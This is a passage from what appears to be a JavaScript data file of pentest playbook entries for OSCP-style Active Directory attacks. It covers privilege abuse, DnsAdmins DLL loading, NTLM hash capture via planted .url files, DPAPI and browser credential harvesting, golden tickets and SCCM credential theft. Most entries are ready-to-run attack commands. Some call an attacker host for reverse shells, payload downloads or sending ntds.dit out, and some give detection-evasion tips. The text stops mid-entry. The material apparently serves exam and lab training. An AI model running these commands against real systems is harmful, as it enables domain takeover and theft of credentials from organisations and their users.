notes:'AD Sites map physical network locations to IP subnets, controlling which DC users authenticate to. This reveals: internal IP ranges you may not know about (add to Ligolo routes / proxychains targets), geographic office locations, multi-site environments. All subnets in AD are part of your attack surface. PowerView alternative: Get-DomainSubnet | Select-Object name,siteobject. LDAP from Linux: ldapsearch -H ldap://{DC_IP} -D "{USERNAME}@{DOMAIN}" -w {PASSWORD} -b "CN=Subnets,CN=Sites,CN=Configuration,{BASE_DN}" -s sub "(objectClass=subnet)" name. Add discovered subnets to Ligolo: sudo ip route add {SUBNET}/24 dev ligolo.'}

// ═══════════════════════════════════════════════════════════════════════════════════════════
// PHASE: PRIVILEGE-ESCALATION — OSCP Core: SeRestore/SeBackup, DnsAdmins, Writable Share
// ═══════════════════════════════════════════════════════════════════════════════════════════

,{id:'PRIV_RESTORE_001',phase:'privilege-escalation',title:'SeRestorePrivilege → ntds.dit Extraction',desc:'Abuse SeRestorePrivilege to copy ntds.dit via registry save, or hijack Utilman.exe for SYSTEM shell',tool:'reg',os:'windows',noise:'med',auth:'required',
cmd:'# Step 1: Confirm privilege\nwhoami /priv\n\n# Step 2a: Copy ntds.dit via Volume Shadow Copy (needs SeRestorePrivilege)\ndiskshadow /s C:\\Temp\\shadow.txt\n# shadow.txt contents: set context persistent nowriters | add volume c: alias myVol | create | expose %myVol% z:\nrobocopy /b z:\\Windows\\NTDS C:\\Temp ntds.dit\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM\n\n# Step 2b: Hijack Utilman.exe (accessibility → SYSTEM shell at login screen)\ncmd /c copy C:\\Windows\\System32\\Utilman.exe C:\\Temp\\Utilman.exe.bak\ncmd /c copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Utilman.exe\n\n# Step 3: Extract from attacker box\nimpacket-secretsdump -ntds C:\\Temp\\ntds.dit -system C:\\Temp\\SYSTEM LOCAL',
failureIndicators:['SeRestorePrivilege not present in whoami /priv','Diskshadow blocked by AV/EDR','robocopy: access denied — try reg save method instead','Utilman.exe hijack requires reboot to trigger'],
notes:'SeRestorePrivilege (and SeBackupPrivilege) allows bypassing file system ACLs when reading/writing. Both are commonly assigned to service accounts, IIS app pools, backup operators groups. Two escalation paths: (1) ntds.dit copy — most reliable. Use diskshadow to create VSS snapshot, robocopy /b bypasses DACL, reg save captures SYSTEM hive for decryption key. Then run secretsdump locally on attacker box. (2) Utilman.exe hijack — replace Utilman.exe (runs as SYSTEM before login) with cmd.exe. Trigger: connect via RDP, press Win+U at login screen → SYSTEM cmd shell. After use, RESTORE the backup: copy Utilman.exe.bak back over cmd.exe. SeBackupPrivilege follows the same path. Check with: whoami /priv | findstr /i "restore backup".'}

,{id:'PRIV_RESTORE_002',phase:'privilege-escalation',title:'SeBackupPrivilege → Registry/NTDS Dump',desc:'Abuse SeBackupPrivilege to read ntds.dit and SYSTEM hive directly using wbadmin or reg',tool:'wbadmin',os:'windows',noise:'med',auth:'required',
cmd:'# Check for SeBackupPrivilege\nwhoami /priv\n\n# Method 1: reg save bypasses ACL via SeBackupPrivilege\nreg save HKLM\\SAM C:\\Temp\\sam\nreg save HKLM\\SYSTEM C:\\Temp\\system\nreg save HKLM\\SECURITY C:\\Temp\\security\n\n# Exfil and dump from Linux\nimpacket-secretsdump -sam C:\\Temp\\sam -system C:\\Temp\\system -security C:\\Temp\\security LOCAL\n\n# Method 2: wbadmin to backup and copy ntds.dit\nwbadmin start backup -backuptarget:\\\\{ATTACKER_IP}\\share -include:c:\\windows\\ntds -quiet\nwbadmin get versions\nwbadmin start recovery -version:MM/DD/YYYY-HH:MM -itemtype:file -items:c:\\windows\\ntds\\ntds.dit -recoverytarget:C:\\Temp -notrestoreacl',
failureIndicators:['SeBackupPrivilege not listed in whoami /priv','wbadmin not available on workstations (server feature)','reg save blocked by AppLocker','Network share not accessible for wbadmin method'],
notes:'SeBackupPrivilege is the sister privilege to SeRestorePrivilege. It allows reading any file regardless of DACL. reg save of SAM+SYSTEM hive gives all local account hashes (useful for local admin PTH). For domain hashes, combine with diskshadow/VSS copy of ntds.dit. The wbadmin method can beam the ntds.dit directly to your SMB share. Both privileges are often granted to: Backup Operators group members, SQL service accounts (for database backups), IIS application pool identities. These are frequently found in OSCP labs (Heist, Vault). Always check: net localgroup "Backup Operators" and whoami /priv after every new shell you get.'}

,{id:'DNSADMINS_001',phase:'privilege-escalation',title:'DnsAdmins Group → DLL Injection → SYSTEM',desc:'Abuse DnsAdmins group membership to load a malicious DLL via the DNS service and gain SYSTEM',tool:'msfvenom',os:'windows',noise:'high',auth:'required',
cmd:'# Step 1: Confirm DnsAdmins membership\nnet user {USERNAME} /domain\nnet group "DnsAdmins" /domain\n\n# Step 2: Generate malicious DLL (reverse shell)\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f dll -o malicious.dll\n# OR pure cmd payload (no msfvenom):\ncat > /tmp/dns_payload.c << EOF\n#include <windows.h>\nBOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) {\n  if(r==DLL_PROCESS_ATTACH) system("net localgroup administrators {USERNAME} /add");\n  return TRUE;\n}\nEOF\n\n# Step 3: Host DLL on attacker SMB share\nimpacket-smbserver share /tmp/malicious/ -smb2support\n\n# Step 4: Configure DNS server to load the DLL\ndnscmd {DC_NAME} /config /serverlevelplugindll \\\\{ATTACKER_IP}\\share\\malicious.dll\n\n# Step 5: Restart DNS service (requires DnsAdmins rights)\nsc stop dns && sc start dns\n\n# Step 6: Cleanup (remove DLL ref or service breaks permanently)\ndnscmd {DC_NAME} /config /serverlevelplugindll ""',
failureIndicators:['Not a member of DnsAdmins','DNS service restart blocked — needs admin rights on DC (not just DnsAdmins)','DLL not reachable from DC — SMB blocked','DNS service crashes and breaks domain resolution — cleanup immediately'],
notes:'DnsAdmins is a common group in AD environments and is frequently found via BloodHound or enumeration. The DNS service on the DC runs as SYSTEM and loads plugins via ServerlevelPluginDLL. As a DnsAdmins member you can set this registry key without DA. However: restarting the DNS service requires local admin on the DC OR membership in a group with that permission — in some OSCP labs this is given via another misconfiguration. CRITICAL: After exploitation, IMMEDIATELY remove the DLL reference (Step 6) — if left configured, every DNS restart loads the payload, potentially breaking domain resolution and alerting defenders. Alternative: instead of reverse shell, add your user to local administrators group (cleaner, no callback).'}

,{id:'SMB_SHARE_STEAL_001',phase:'credential-access',title:'Malicious URL/LNK on Writable SMB Share → NTLM Hash Capture',desc:'Place a .url or .lnk file on a writable share to auto-steal NTLMv2 hashes when users browse the share',tool:'Responder',os:'linux',noise:'med',auth:'none',
cmd:'# Step 1: Find writable shares\nnxc smb {NETWORK}.0/24 -u {USERNAME} -p "{PASSWORD}" --shares | grep WRITE\n\n# Step 2: Create malicious .url file (auto-loads UNC path on folder open)\ncat > /tmp/@steal.url << EOF\n[InternetShortcut]\nURL=file://{ATTACKER_IP}/share\nIconFile=\\\\{ATTACKER_IP}\\share\\icon.ico\nIconIndex=1\nEOF\n\n# Step 3: Create malicious .lnk (alternative — loads icon from attacker)\n# Use: https://github.com/dievus/lnkbomb or manual creation in Windows\n# python3 lnkbomb.py -t {ATTACKER_IP}\n\n# Step 4: Upload to writable share\nsmbclient \\\\\\\\{TARGET_HOST}\\\\sharename -U {USERNAME}%{PASSWORD} -c "put /tmp/@steal.url"\n\n# Step 5: Start Responder (capture only — exam-safe)\nresponder -I {INTERFACE} -A\n# Or for active capture:\nresponder -I {INTERFACE}\n\n# Step 6: Wait for user to browse share → NTLMv2 hash arrives\n# Crack: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt',
failureIndicators:['No writable shares found (check authenticated vs unauthenticated)','NTLM authentication disabled on the domain (rare but possible)','NetNTLMv2 hash is not crackable — try relay instead','Responder already running on interface'],
notes:'This is one of the most effective OSCP techniques — confirmed in Vault, Heist, and many exam reports. Key insight: .url files trigger an outbound NTLM authentication the MOMENT a user opens the folder containing the file in Windows Explorer (no click required). The @-prefix in the filename makes it sort to the top of the directory listing (more likely to trigger immediately). After cracking the NTLMv2 hash (hashcat -m 5600), you get the plaintext password. For OSCP exam: use Responder in -A (analyze) mode to stay compliant with the no-active-poisoning rule. The captured hash comes from the legitimate UNC authentication, not from LLMNR/NBT-NS poisoning. Also try: .scf files (older but still works on legacy), desktop.ini modification in accessible folders.'}

,{id:'RUNASCS_001',phase:'lateral-movement',title:'RunasCs — Run as Different User in Non-Interactive Shell',desc:'Execute commands or get a shell as a different user when you have their credentials but cannot use runas interactively',tool:'RunasCs',os:'windows',noise:'low',auth:'required',
cmd:'# Basic: execute command as different user\nRunasCs.exe {TARGET_USER} {PASSWORD} cmd.exe -r {ATTACKER_IP}:443\n\n# Run PowerShell command\nRunasCs.exe {TARGET_USER} {PASSWORD} powershell.exe -r {ATTACKER_IP}:443\n\n# Execute specific command (no interactive shell)\nRunasCs.exe {TARGET_USER} {PASSWORD} "cmd /c whoami > C:\\Temp\\out.txt"\n\n# With domain prefix\nRunasCs.exe {NETBIOS}\\{TARGET_USER} {PASSWORD} cmd.exe -r {ATTACKER_IP}:443\n\n# Bypass UAC if target is local admin\nRunasCs.exe {TARGET_USER} {PASSWORD} cmd.exe -r {ATTACKER_IP}:443 -d 0 --bypass-uac',
failureIndicators:['AppLocker blocks RunasCs.exe — rename it or encode it','Firewall blocks outbound callback — use a port that is allowed (443, 80, 8080)','User has no interactive logon right — may still work for network logon','Credential wrong — verify with nxc first'],
notes:'RunasCs.exe is the non-interactive replacement for runas.exe in restricted shell contexts. Critical for OSCP when you have: a low-priv shell as user A (e.g., IIS, MSSQL service account), and credentials for user B (found via LDAP description, cracked hash, GPP, etc.) but cannot spawn a new interactive session. RunasCs creates a new logon session and runs the specified program under user B identity. The -r flag sends a reverse shell directly to your listener. Download: https://github.com/antonioCoco/RunasCs. Drop to target: certutil -urlcache -f http://{ATTACKER_IP}:8001/RunasCs.exe C:\\Temp\\RunasCs.exe. Alternative without RunasCs: net use \\\\{ATTACKER_IP}\\share /user:{USERNAME} {PASSWORD} (creates credential session) then psexec locally.'}

,{id:'WINPEAS_001',phase:'privilege-escalation',title:'WinPEAS — Windows Privilege Escalation Awesome Script',desc:'Automated Windows enumeration to find all local privilege escalation paths on a compromised host',tool:'WinPEAS',os:'windows',noise:'med',auth:'required',
cmd:'# Download and run WinPEAS\ncertutil -urlcache -f http://{ATTACKER_IP}:8001/winPEASx64.exe C:\\Temp\\winpeas.exe\nC:\\Temp\\winpeas.exe\n\n# Save output to file for review\nC:\\Temp\\winpeas.exe > C:\\Temp\\winpeas_out.txt 2>&1\ntype C:\\Temp\\winpeas_out.txt\n\n# Run specific category only\nC:\\Temp\\winpeas.exe systeminfo\nC:\\Temp\\winpeas.exe servicesinfo\nC:\\Temp\\winpeas.exe windowscreds\n\n# PowerShell version\npowershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).downloadString(\"http://{ATTACKER_IP}:8001/winPEAS.ps1\")"',
failureIndicators:['AV detects winPEAS.exe — try renaming or use PowerShell version','certutil blocked — use: powershell (New-Object Net.WebClient).DownloadFile(...)','Long output gets truncated in shell — redirect to file first','ConstrainedLanguage Mode blocks PS version — use binary'],
notes:'WinPEAS is the standard first-step tool after gaining a Windows shell in OSCP. It checks 200+ privilege escalation vectors automatically. Key sections to review: System Information (OS version, patch level, installed KBs — correlate to known CVEs), Services (unquoted service paths, weak permissions, modifiable binaries), Scheduled Tasks (check for writeable task scripts), Registry (AlwaysInstallElevated, AutoRun keys), Credentials (saved credentials, Credential Manager, browser passwords), Network (listening ports — internal services not exposed externally). Priority findings: AlwaysInstallElevated (msiexec /i payload.msi to get SYSTEM), Unquoted Service Paths, Writeable service binaries, SeImpersonatePrivilege. Download: https://github.com/peass-ng/PEASS-ng/releases. Always run on EVERY Windows host you compromise in OSCP — takes 2 minutes and reveals everything.'}

// ═══════════════════════════════════════════════════════════════════════════════════════════
// PHASE: CREDENTIAL-ACCESS — DPAPI & Credential Manager Harvesting
// ═══════════════════════════════════════════════════════════════════════════════════════════

,{id:'DPAPI_001',phase:'credential-access',title:'SharpDPAPI — Triage All Credentials',desc:'Harvest all DPAPI-protected credentials on a Windows host: browser passwords, credential manager, certificates',tool:'SharpDPAPI',os:'windows',noise:'med',auth:'required',
cmd:'SharpDPAPI.exe triage\nSharpDPAPI.exe credentials /unprotect\nSharpDPAPI.exe vaults /unprotect\nSharpDPAPI.exe certificates /unprotect',
failureIndicators:['SharpDPAPI.exe not on target','AV detects SharpDPAPI','SYSTEM privileges required for machine-level DPAPI blobs'],
notes:'DPAPI (Data Protection API) encrypts passwords for browsers, Windows Credential Manager, RDP saved credentials, and certificates. SharpDPAPI triage: auto-discovers all blobs and attempts decryption with user masterkeys. Requires the user to be logged in or their masterkey cached. For machine-level secrets (IIS app pool creds, scheduled task creds): SharpDPAPI.exe machinetriage — requires SYSTEM. For browser creds: SharpDPAPI.exe logins /unprotect (Chrome/Edge/Brave passwords). Full syntax: SharpDPAPI.exe [triage|credentials|vaults|logins|certificates|masterkeys] [/unprotect|/target:FILE|/password:X]. Combine with SharpChrome.exe for full browser cookie/password extraction.'}

,{id:'DPAPI_002',phase:'credential-access',title:'DonPAPI — Remote DPAPI Dump (Linux)',desc:'Remotely extract all DPAPI-protected secrets from Windows hosts without touching disk',tool:'DonPAPI',os:'linux',noise:'med',auth:'required',
cmd:"donpapi collect -u '{DOMAIN}/{USERNAME}:{PASSWORD}' -t {TARGET_HOST}\ndonpapi collect -u '{DOMAIN}/{USERNAME}' --hashes :{NTHASH} -t {NETWORK}.0/24 --dc-ip {DC_IP}",
failureIndicators:['Local admin required on target','SMB blocked','Error: Cannot open HKCU on remote host — user must have active session'],
notes:'DonPAPI is the Linux equivalent of SharpDPAPI — runs fully remotely over SMB without dropping any binary. It collects: Windows Credential Manager (passwords, certificates), Chrome/Edge browser saved passwords, VPN client credentials, SCCM task sequence credentials, mRemoteNG saved connections, MobaXterm sessions. Install: pip3 install donpapi. Requires local admin on target host. When targeting a subnet, DonPAPI auto-discovers all hosts with admin access. Results saved to donpapi_output/{IP}/. Most valuable: look for scheduled task / service account credentials stored in Credential Manager — these are often domain admin accounts.'}

,{id:'DPAPI_003',phase:'credential-access',title:'Mimikatz DPAPI Blob Decrypt',desc:'Decrypt specific DPAPI-protected credentials or master keys with Mimikatz',tool:'Mimikatz',os:'windows',noise:'high',auth:'required',
cmd:'privilege::debug\nsekurlsa::dpapi\ndpapi::cred /in:"%APPDATA%\\Microsoft\\Credentials\\{CRED_FILE}" /unprotect\ndpapi::vault /in:"%APPDATA%\\Microsoft\\Vault\\{VAULT_GUID}\\{VAULT_FILE}" /unprotect',
failureIndicators:['Credential Vault empty','Masterkey not cached — user must be logged in','LSASS PPL protected'],
notes:'Mimikatz DPAPI commands decrypt protected blobs on a live Windows host. sekurlsa::dpapi dumps all cached masterkeys from LSASS memory (best starting point — all keys are there if user is logged in). dpapi::cred /in:FILE decrypts a specific credential blob found in: %APPDATA%\\Microsoft\\Credentials\\ (user creds) or C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\ (machine creds). Find credential files: dir /a "%APPDATA%\\Microsoft\\Credentials\\". Key insight: cached masterkeys from sekurlsa::dpapi can be used to decrypt ANY blob from that user, even without their password. Save masterkey GUIDs and blobs for offline decryption with impacket-dpapi.'}

,{id:'DPAPI_004',phase:'credential-access',title:'LaZagne — Multi-App Credential Harvest',desc:'Automatically extract stored passwords from 60+ applications on a compromised Windows host',tool:'LaZagne',os:'windows',noise:'high',auth:'required',
cmd:'LaZagne.exe all\nLaZagne.exe all -oN -output C:\\Temp\\\nLaZagne.exe browsers\nLaZagne.exe sysadmin\nLaZagne.exe wifi',
failureIndicators:['AV detects LaZagne','Run as target user for browser passwords (not SYSTEM)','Some browsers clear plaintext storage on exit'],
notes:'LaZagne searches 60+ applications for stored plaintext or weakly-protected credentials. Categories: browsers (Chrome, Firefox, Edge, IE), sysadmin tools (WinSCP, PuTTY, mRemoteNG, Keepass, FileZilla), mail clients (Outlook, Thunderbird), WiFi passwords, Windows Credential Manager, git credentials, database tools. -oN saves to file instead of stdout. Run as the logged-on user for browser passwords (browser profiles are user-specific). Run as SYSTEM for machine-level secrets. Best post-exploitation first step — often finds cleartext passwords immediately. Combine with DonPAPI from Linux for remote execution without binary drop.'}

// ═══════════════════════════════════════════════════════════════════════════════════════════
// PHASE: PRIVILEGE-ESCALATION — Targeted Kerberoasting via WriteSPN
// ═══════════════════════════════════════════════════════════════════════════════════════════

,{id:'TARGETED_KERB_001',phase:'privilege-escalation',title:'WriteSPN → Targeted Kerberoasting',desc:'Abuse WriteSPN/GenericWrite ACL: set a fake SPN on a high-value account, kerberoast it, crack hash',tool:'PowerView',os:'windows',noise:'med',auth:'required',
cmd:'# Step 1: Confirm WriteSPN / GenericWrite ACL on target\nGet-DomainObjectAcl -Identity {TARGET_USER} -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite"}\n\n# Step 2: Set a fake SPN on the target account\nSet-DomainObject -Identity {TARGET_USER} -Set @{serviceprincipalname="nonexistent/FAKE"}\n\n# Step 3: Kerberoast the target\nGet-DomainUser {TARGET_USER} | Get-DomainSPNTicket | ConvertTo-Hashcat | Out-File targeted_tgs.txt\n\n# Step 4: Clean up SPN after cracking\nSet-DomainObject -Identity {TARGET_USER} -Clear serviceprincipalname',
failureIndicators:['WriteProperty or GenericWrite not confirmed on target','Set-DomainObject requires PowerView loaded','SPN already exists — check first with Get-DomainUser {TARGET_USER} -Properties serviceprincipalname'],
notes:'Targeted Kerberoasting via WriteSPN is a surgical escalation path. If you have GenericWrite or WriteProperty (serviceprincipalname) on a user account, you can: write a fake SPN → request a TGS for it → crack the RC4 hash offline → remove the SPN (cleanup). Perfect for escalating to a high-value service account (DBA, admin, SQL) without touching the password. Always clean up the SPN after (Step 4) to avoid detection. Crack with: hashcat -m 13100 targeted_tgs.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule. From Linux (if you have password/hash): impacket-GetUserSPNs -request-user {TARGET_USER} after using targetedKerberoast.py: python3 targetedKerberoast.py -v -d {DOMAIN} -u {USERNAME} -p {PASSWORD} --dc-ip {DC_IP}'}

// ═══════════════════════════════════════════════════════════════════════════════════════════
// PHASE: DOMAIN-DOMINANCE — Cross-Forest Trust Attack (Child → Parent Domain)
// ═══════════════════════════════════════════════════════════════════════════════════════════

,{id:'TRUST_ATK_001',phase:'domain-dominance',title:'Child-to-Parent Domain Escalation (ExtraSIDs)',desc:'Forge a golden ticket with parent domain Enterprise Admin SID to instantly own the parent domain',tool:'Impacket',os:'linux',noise:'low',auth:'required',
cmd:"# Step 1: Get child domain krbtgt hash (from DCSync on child DC)\nimpacket-secretsdump -just-dc-user krbtgt {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}\n\n# Step 2: Get SIDs\nimpacket-getPac -targetUser administrator -baseDC {DC_IP} '{DOMAIN}/{USERNAME}:{PASSWORD}'\n# Or via PowerView on Windows: Get-DomainSID; Get-DomainSID -Domain {TARGET_DOMAIN}\n\n# Step 3: Forge inter-realm golden ticket with Enterprise Admin ExtraSID\nimpacket-ticketer -nthash {NTHASH} -domain-sid {CHILD_DOMAIN_SID} -domain {DOMAIN} -extra-sid {PARENT_ENTERPRISE_ADMIN_SID} -spn krbtgt/{TARGET_DOMAIN} administrator\n\n# Step 4: Use ticket to request TGS in parent domain\nexport KRB5CCNAME=administrator.ccache\nimpacket-getST -k -no-pass -spn cifs/{DC_NAME}.{TARGET_DOMAIN} -dc-ip {DC_IP} {TARGET_DOMAIN}/administrator",
failureIndicators:['SID filtering enabled on trust (ExtraSIDs attack blocked)','Need krbtgt hash of child domain first (do DCSync on child DC)','Enterprise Admin SID format: S-1-5-21-<parent_domain_id>-519'],
notes:'The child-to-parent domain escalation exploits the fact that when SID filtering is disabled (the default for parent-child trusts within the same forest), extra SIDs injected into a ticket are trusted by the parent domain. Steps: (1) Compromise the child domain completely (get child krbtgt hash via DCSync). (2) Identify the parent domain Enterprise Admin SID (S-1-5-21-PARENT-519). (3) Forge an inter-realm golden ticket for krbtgt of the parent domain, injecting the EA SID in the ExtraSIDs field. (4) Use the ticket to request a TGS in the parent domain → full parent domain access. Check SID filtering: nltest /domain_trusts — look for "SID Filtering = Enabled" (rare for intra-forest trusts). Windows version: use Mimikatz kerberos::golden with /sids: parameter.'}

,{id:'TRUST_ATK_002',phase:'domain-dominance',title:'Child-to-Parent via Mimikatz (Windows)',desc:'Forge inter-realm ticket with ExtraSIDs using Mimikatz for child-to-parent domain privilege escalation',tool:'Mimikatz',os:'windows',noise:'high',auth:'required',
cmd:'# Requires krbtgt hash + SIDs — run DCSync first\nlsadump::dcsync /user:krbtgt /domain:{DOMAIN}\n\n# Forge the golden ticket with parent EA SID injected\nkerberos::golden /user:Administrator /domain:{DOMAIN} /sid:{CHILD_DOMAIN_SID} /krbtgt:{NTHASH} /sids:{PARENT_ENTERPRISE_ADMIN_SID} /ptt\n\n# Verify access to parent domain DC\nls \\\\{DC_NAME}.{TARGET_DOMAIN}\\C$\npsexec \\\\{DC_NAME}.{TARGET_DOMAIN} cmd.exe',
failureIndicators:['SID filtering blocks injected SIDs','Mimikatz not running as SYSTEM / SeDebugPrivilege required','krbtgt hash must be from CHILD domain, not parent'],
notes:'Mimikatz version of child-to-parent escalation. /sids: parameter injects additional SIDs (ExtraSIDs) into the PAC. The parent DC trusts any SID that appears in tickets from child domain, since they share a krbtgt trust chain and SID filtering is off by default intra-forest. After /ptt (pass-the-ticket), try accessing the parent DC immediately: dir \\\\PARENTDC\\C$ or Enter-PSSession. Clean indicators: this attack leaves minimal logs since it uses legitimate Kerberos mechanisms — the forged ticket looks like a normal cross-domain authentication. Detection: Kerberos event 4769 with unusual SIDs in the PAC (requires advanced audit settings).'},
{id:'SCCM_001',phase:'enumeration',title:'SCCM Recon (sccmhunter)',desc:'Enumerate SCCM infrastructure — find servers, site codes, and roles',tool:'sccmhunter',os:'linux',noise:'low',auth:'required',
cmd:"python3 sccmhunter.py auth -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -dc-ip {DC_IP}\npython3 sccmhunter.py show -all\nnxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -M sccm\nldeep ldap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -s ldap://{DC_IP} sccm",
failureIndicators:['No SCCM infrastructure found','Authentication failed','sccmhunter not installed'],
notes:'SCCM (System Center Configuration Manager) is present in 60% of enterprise environments and is a goldmine for credential theft and lateral movement. Start with sccmhunter to map all SCCM roles: Management Point (MP), Distribution Point (DP), Site Server, and Site Database. The show -all command lists all discovered assets. Run the nxc sccm module and ldeep to cross-reference. Once you know the SCCM topology, proceed to SCCM_002 through SCCM_011 depending on your access level.'},
{id:'SCCM_002',phase:'enumeration',title:'SCCM Local Site Info (SharpSCCM)',desc:'Enumerate SCCM site info and local secrets from a managed Windows endpoint',tool:'SharpSCCM',os:'windows',noise:'low',auth:'required',
cmd:"SharpSCCM.exe local site-info\nSharpSCCM.exe local secrets -m wmi\nSharpSCCM.exe local secrets -m disk",
failureIndicators:['Not a managed client','Access denied','SCCM not installed'],
notes:'On a Windows machine that is an SCCM-managed client, SharpSCCM local commands retrieve the site code, management point FQDN, and the Network Access Account (NAA) credentials stored on disk and in WMI. NAA is a domain account configured for unauthenticated network access to the DP, often with elevated rights. The -m wmi and -m disk variants check two different storage locations — try both. Output includes domain/username and the hashed or obfuscated password, which SharpSCCM decrypts via DPAPI.'},
{id:'SCCM_003',phase:'credential-access',title:'SCCM NAA Credentials (SharpSCCM)',desc:'Extract Network Access Account credentials stored by SCCM on managed client',tool:'SharpSCCM',os:'windows',noise:'low',auth:'required',
cmd:"SharpSCCM.exe local secrets -m wmi\nSharpSCCM.exe local secrets -m disk\nSharpSCCM.exe get naa",
failureIndicators:['No NAA configured','CcmExec service not running','Access denied'],
notes:'NAA credentials are stored by the SCCM client in encrypted form in WMI and on disk. SharpSCCM decrypts them using DPAPI. These are domain credentials — often a service account with access to all Distribution Points. Immediately test: nxc smb {DC_IP} -u NAA_USER -p NAA_PASS -d {DOMAIN}. If the NAA account has local admin anywhere, pivot there. sccmdecryptpoc.exe can also decrypt the raw values manually. The NAA account password rarely rotates — a single extraction can be valid for years.'},
{id:'SCCM_004',phase:'credential-access',title:'SCCM Policy Request Credentials (pxethief)',desc:'Request SCCM machine policy anonymously to extract NAA credentials without auth',tool:'pxethief/policysecretunobfuscate',os:'linux',noise:'med',auth:'none',
cmd:"python3 pxethief.py 2 {SCCM_MP_IP}\npython3 policysecretunobfuscate.py <obfuscated_value>",
failureIndicators:['HTTP 401 on policy request','MP requires authentication','Policy encryption error'],
notes:'No credentials needed. SCCM Management Points that do not enforce HTTP signing allow anonymous policy requests. pxethief.py 2 contacts the MP, requests the machine policy, and downloads the obfuscated NAA credentials. policysecretunobfuscate.py then decrypts the obfuscated value to cleartext. Works when MP is configured for HTTP (not HTTPS) and does not enforce signing. Pre-condition: know the MP IP from SCCM_001 enumeration or nmap port 80 scan.'},
{id:'SCCM_005',phase:'credential-access',title:'SCCM PXE Boot Hash Extraction',desc:'Extract credentials from PXE-booted media without authentication',tool:'pxethief',os:'linux',noise:'low',auth:'none',
cmd:"tftp -i {DP_IP} GET \"\\SMSTemp\\boot.var\"\npython3 pxethief.py 5 \"\\SMSTemp\\boot.var\"\npython3 pxethief.py 1\nhashcat -m 19850 pxe_hash.txt {WORDLIST}",
failureIndicators:['TFTP connection refused','boot.var not found','PXE not enabled'],
notes:'No credentials required. When PXE boot is enabled on a Distribution Point, the boot.var file contains a password-protected media variable file. pxethief.py 5 cracks the hash from the file, pxethief.py 1 targets the DP directly. Hash format is sccm$aes128$ — crack with hashcat mode 19850. On success you get a PXE media password that grants SCCM client access and potentially NAA credentials. TFTP port 69/UDP must be reachable. Confirm: nmap -sU -p 69 {DP_IP}.'},
{id:'SCCM_006',phase:'credential-access',title:'SCCM Site DB Credentials',desc:'Extract all credential values stored in the SCCM site database via MSSQL',tool:'mssqlclient/sccmdecryptpoc',os:'linux',noise:'med',auth:'required',
cmd:"impacket-mssqlclient '{DOMAIN}/{USERNAME}:{PASSWORD}'@{SCCM_MSSQL_IP} -windows-auth\nuse CM_{SITE_CODE};\nSELECT * FROM SC_UserAccount;\n# Then on SCCM server: sccmdecryptpoc.exe <cyphered_value>",
failureIndicators:['SA rights required','CM_ database not found','Decryption key unavailable'],
notes:'The SCCM site database (CM_{SITE_CODE}) stores all service account credentials in encrypted form. Query SC_UserAccount to get the encrypted values. These are encrypted with the site server machine account key — sccmdecryptpoc.exe running on the SCCM server decrypts them. Requires SA (sysadmin) rights on MSSQL, or local admin on the SCCM server. This credential store often contains DA-equivalent service accounts used for SCCM tasks across the entire environment.'},
{id:'SCCM_007',phase:'credential-access',title:'SCCM Distribution Point Credential Loot',desc:'Download credential files and scripts from SCCM Distribution Points over HTTP or SMB',tool:'sccm-http-looter/NetExec',os:'linux',noise:'med',auth:'required',
cmd:"sccm-http-looter -server {DP_IP} -u '{USERNAME}' -p '{PASSWORD}'\nnxc smb {DP_IP} -u {USERNAME} -p '{PASSWORD}' -M cmloot -o INVENTORY=sccmfiles.txt",
failureIndicators:['DP requires authentication','No script packages found','Access denied'],
notes:'Distribution Points serve software packages over HTTP or SMB. sccm-http-looter crawls the DP HTTP service to find and download credential files, scripts, and deployment packages that may contain hardcoded passwords. The CMLoot nxc module does the same over SMB. Common findings: SQL connection strings, service account passwords in deployment scripts, application config files, install media with embedded creds. The -cmlootinventory flag creates an inventory file before downloading.'},
{id:'SCCM_008',phase:'privilege-escalation',title:'SCCM Site Server NTLM Relay to MSSQL',desc:'Coerce SCCM site server to relay NTLM to its own MSSQL for sysadmin access',tool:'ntlmrelayx/coercer',os:'linux',noise:'high',auth:'required',
cmd:"impacket-ntlmrelayx -smb2support -ts -t mssql://{SCCM_MSSQL_IP} -q \"SELECT SYSTEM_USER\"\npython3 coercer.py coerce -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -l {ATTACKER_IP} -t {SCCM_SERVER_IP}",
failureIndicators:['SMB signing required on SCCM server','Relay failed','MSSQL not accessible'],
notes:'SCCM site servers run as SYSTEM (machine account) and frequently have sysadmin rights on the SCCM MSSQL database. Coerce the SCCM server to authenticate to your ntlmrelayx, relay to the MSSQL server. With SYSTEM-level relay you get sysadmin on MSSQL, then xp_cmdshell, then SYSTEM on the SQL server. Run ntlmrelayx first, then coerce. Verify the grant with: SELECT IS_SRVROLEMEMBER(sysadmin). Sysadmin on the SCCM MSSQL often leads to full domain compromise via SCCM admin.'},
{id:'SCCM_009',phase:'privilege-escalation',title:'SCCM Client Push Exploitation',desc:'Force SCCM client push installation to relay SCCM server auth to target or attacker',tool:'SharpSCCM/ntlmrelayx',os:'both',noise:'high',auth:'required',
cmd:"impacket-ntlmrelayx -smb2support -ts -t smb://{TARGET_IP} -socks\nSharpSCCM.exe invoke client-push -mp {SCCM_MP_IP} -sc {SITE_CODE} -t {ATTACKER_IP}",
failureIndicators:['Push installation not enabled','Client already installed','SCCM admin rights required'],
notes:'Requires SCCM admin rights (Full Administrator role). Trigger a client push to an attacker-controlled IP. The SCCM server authenticates with its machine account — relay that to another target. Alternatively, if Automatic Site Assignment is enabled, create a DNS A record pointing a non-existent computer name to your IP and wait 5 minutes for the SCCM server to push the client automatically (no SharpSCCM needed). Very high impact: the SCCM server machine account is often a domain admin equivalent.'},
{id:'SCCM_010',phase:'lateral-movement',title:'SCCM Admin Script Execution',desc:'Execute arbitrary scripts on all managed devices as SYSTEM via SCCM admin rights',tool:'sccmhunter',os:'linux',noise:'high',auth:'required',
